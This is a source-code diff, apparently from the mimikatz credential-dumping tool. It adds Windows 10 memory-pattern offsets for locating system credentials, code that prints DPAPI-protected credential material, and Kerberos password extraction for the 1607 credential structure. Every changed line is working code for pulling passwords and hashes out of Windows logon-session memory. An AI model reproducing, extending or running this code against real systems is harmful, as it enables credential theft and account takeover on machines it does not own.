@@ -539,6 +539,7 @@ KULL_M_PATCH_GENERIC SysCredReferences[] = {
 	{KULL_M_WIN_MIN_BUILD_7,		{sizeof(PTRN_WI60_SysCred),		PTRN_WI60_SysCred},		{0, NULL}, { -7, -13,  8}},
 	{KULL_M_WIN_MIN_BUILD_8,		{sizeof(PTRN_WN62_SysCred),		PTRN_WN62_SysCred},		{0, NULL}, {-10, -19,  7}},
 	{KULL_M_WIN_MIN_BUILD_BLUE,		{sizeof(PTRN_WN62_SysCred),		PTRN_WN62_SysCred},		{0, NULL}, {-27, -4,   7}},
+	{KULL_M_WIN_MIN_BUILD_10,		{sizeof(PTRN_WN62_SysCred),		PTRN_WN62_SysCred},		{0, NULL}, {-20, -26,  7}},
 };
 #elif defined _M_IX86
 BYTE PTRN_WI51_SysCred[] = {0x00, 0xab, 0x33, 0xc0, 0xbf};
@@ -552,6 +553,7 @@ KULL_M_PATCH_GENERIC SysCredReferences[] = {
 	{KULL_M_WIN_MIN_BUILD_VISTA,	{sizeof(PTRN_WI60_SysCred),		PTRN_WI60_SysCred},		{0, NULL}, { 34,   4, 20}},
 	{KULL_M_WIN_MIN_BUILD_8,		{sizeof(PTRN_WI62_SysCred),		PTRN_WI62_SysCred},		{0, NULL}, { 36,   6, 17}},
 	{KULL_M_WIN_MIN_BUILD_BLUE,		{sizeof(PTRN_WI63_SysCred),		PTRN_WI63_SysCred},		{0, NULL}, { 31,   6, 18}},
+	{KULL_M_WIN_MIN_BUILD_10,		{sizeof(PTRN_WI63_SysCred),		PTRN_WI63_SysCred},		{0, NULL}, { 35,   6, 20}},
 };
 #endif
 NTSTATUS kuhl_m_sekurlsa_dpapi_system(int argc, wchar_t * argv[])
@@ -980,6 +982,11 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 								kprintf(L"\n\t * SHA1     : ");
 								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToShaOwPassword, SHA_DIGEST_LENGTH, 0);
 							}
+							if(pMSVHelper->offsetToisDPAPIProtected && *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisDPAPIProtected))
+							{
+								kprintf(L"\n\t * DPAPI    : ");
+								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToDPAPIProtected + 6, LM_NTLM_HASH_LENGTH, 0); // 020000000000
+							}
 							if(sid && (*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) || *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword)))
 								kuhl_m_dpapi_oe_credential_add(sid, NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) ? msvCredentials + pMSVHelper->offsetToNtOwfPassword : NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword) ? msvCredentials + pMSVHelper->offsetToShaOwPassword : NULL, NULL, NULL);
 						}
@@ -1055,6 +1062,8 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 		{
 			if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10)
 				mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL) mesCreds)->Password;
+			else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10_1607)
+				mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->Password;
 			
 			if(mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
 			{
